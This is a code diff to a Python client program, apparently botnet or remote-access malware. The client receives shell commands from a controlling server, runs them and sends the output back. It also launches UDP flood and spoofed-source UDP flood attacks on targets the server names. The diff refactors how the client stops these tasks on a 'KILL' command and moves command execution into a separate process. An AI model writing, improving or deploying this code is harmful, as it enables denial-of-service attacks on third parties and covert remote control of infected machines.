@@ -5,7 +5,7 @@ from __future__ import print_function
 from sys import exit as sysexit, argv
 from time import sleep
 from subprocess import Popen, PIPE
-from multiprocessing import Process, freeze_support
+from multiprocessing import Process, freeze_support, Queue
 from socket import socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM, SOCK_RAW, AF_INET
 from socket import error as sock_error
 from socket import SHUT_RDWR
@@ -196,10 +196,43 @@ class Client(object):
         """Close socket, terminate script's execution."""
         self.quit_signal = True
 
+    def handle_kill(self, proc, q):
+        """Handle KILL command from server."""
+        killed = False
+        self.sock.settimeout(0.1)
+        while (not killed and q.empty()):
+            try:
+                en_data = self.receive(5)
+            except ssl.SSLError: # Timeout
+                continue
+            try:
+                en_data = self.comm_dict[en_data]
+            except KeyError: # Got random data, not KILL
+                continue
+            if en_data == 'KILL':
+                proc.terminate()
+                killed = True
+        self.sock.settimeout(None)
+        return killed
+
     def run_cm(self):
         """Get command to run from server, execute it and send results back."""
         command_size = self.receive(13)
         command = self.receive(int(command_size))
+        q = Queue()
+        proc = Process(target=self.execute, args=(command, q))
+        proc.start()
+        killed = self.handle_kill(proc, q)
+        if not killed: # Process exited normally, not killed
+            decode = q.get()
+            len_decode = get_len(decode, 13)
+            en_stdout = self.send(len_decode)
+            if en_stdout == 0:
+                en_stdout = self.send(decode)
+        return 0
+
+    def execute(self, command, q):
+        """Execute system command on local shell. Called through Process."""
         comm = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
         stdout, stderr = comm.communicate()
         if stderr:
@@ -208,10 +241,7 @@ class Client(object):
             decode = stdout.decode('UTF-8')
         else:
             decode = 'Command has no output'
-        len_decode = get_len(decode, 13)
-        en_stdout = self.send(len_decode)
-        if en_stdout == 0:
-            en_stdout = self.send(decode)
+        q.put(decode)
         return 0
 
     def get_file(self):
@@ -318,6 +348,7 @@ class Client(object):
 
     def udp_flood(self):
         """Get target ip and port from server, start UPD flood wait for 'KILL'."""
+        q = Queue()
         en_data = self.receive(3) # Max ip+port+payload length 999 chars
         en_data = self.receive(int(en_data))
         en_data = en_data.split(":")
@@ -326,20 +357,12 @@ class Client(object):
         msg = en_data[2]
         proc = Process(target=udp_flood_start, args=(target_ip, target_port, msg))
         proc.start()
-        killed = False
-        while not killed:
-            en_data = self.receive(5)
-            try:
-                en_data = self.comm_dict[en_data]
-            except KeyError:
-                continue
-            if en_data == 'KILL':
-                proc.terminate()
-                killed = True
+        self.handle_kill(proc, q)
         return 0
 
     def udp_spoof(self):
         """Get target/spoofed ip and port from server, start UPD spoof wait for 'KILL'."""
+        q = Queue()
         en_data = self.receive(3) # Max ip+port+spoofedip+spoofed port+payload length 999 chars
         en_data = self.receive(int(en_data))
         en_data = en_data.split(":")
@@ -352,16 +375,7 @@ class Client(object):
                                                      spoofed_ip, spoofed_port,
                                                      payload))
         proc.start()
-        killed = False
-        while not killed:
-            en_data = self.receive(5)
-            try:
-                en_data = self.comm_dict[en_data]
-            except KeyError:
-                continue
-            if en_data == 'KILL':
-                proc.terminate()
-                killed = True
+        self.handle_kill(proc, q)
         return 0
 
 
